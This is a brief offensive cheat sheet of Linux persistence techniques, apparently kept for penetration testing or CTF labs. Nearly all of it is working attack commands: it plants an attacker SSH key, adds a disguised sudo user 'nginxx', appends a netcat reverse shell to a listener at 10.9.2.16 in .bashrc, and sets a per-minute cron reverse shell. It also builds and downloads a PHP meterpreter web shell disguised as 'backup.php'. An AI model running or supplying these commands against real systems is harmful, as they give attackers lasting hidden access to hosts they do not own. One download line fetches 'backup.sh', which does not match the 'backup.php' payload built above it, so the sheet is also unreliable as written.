# Persistance Shortcuts
## Linux Persisttance

--> SSH
#This technique requires Public Key Authentication to be enabled in the SSH configuration file
ssh-keygen
## pubkey [paste in remote /home/user/.ssh/authorized_keys.]
## passphrase --> cyber

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDVAVvQFVGiNGuhlfXeLgA9+rwkzG3YOMAz5efIlM97edEOobq6qLHZJN3V5MrAy4GXZ01slEKMgRoBwyv9WYB67KMDt/a4L2G5YLUwQQsP1Ht8kVimTxuZ00oq52M+22V1a9wcY2XV9Soj1g0FAzSwloH4xy5tf0GcT68PZ3c4mpAnrGFTk3HoTHZaNqidQDI1EnVRRLrwPX3m1FtKf90vKSo9zzKd3r52uk2tEvr6WOTEHzEV+JEgKoFIME/FlH2Qt95LXEpTDYjfjEcEkPEx37J+buyNW46+IbSLgKWqJ3SeIuYaoc1h5VpGre4fqD4Wg85gOSfvt6g+5/MfuKCAwvIM6k/Ux1np3/ZHWc4Opv8eyVSk2/4QliHBN6diK1laeRPOqd0vcBfCR2tRXIgQGcoGtqycli9jWmNGIZcn8RufLcJOP2zAK6wDlSpqG2VdgK1po48g9JgsbK5VpG3qBbRM2As2tYyGFcCef/q7S14T95iP3bf0F+0gkBbsMsM= cyberxploit@parrot" > authorized_keys


chmod 700 /root/.ssh
chmod 600 /user/.ssh/authorized_keys

--> Local Priviledged User
useradd -m -s /bin/bash nginxx
usermod -aG sudo nginxx
passwd nginxx


--> Unix Shell Config Mod
echo "nc -e /bin/bash 10.9.2.16 9991 2>/dev/null &" >> ~/.bashrc
vi ~/.bashrc
nc -e /bin/bash 10.9.2.16 9991 2>/dev/null &


--> WebShell
## Locally
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.9.2.16 LPORT=4444 -e php/base64 -f raw > backup.php
msfconsole
use multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 10.9.2.16
set LPORT 4444
run

python3 -m http.server 8080

## Remote
cd /var/www/html/
wget http://10.9.2.16:8080/backup.sh

## Browser
http://targetsIP/backup.php


--> Cron Jobs
## NetCat
* * * * * nc 10.9.2.16 9991 -e /bin/sh
## PHP
* * * * * php -f /var/www/html/backup.php
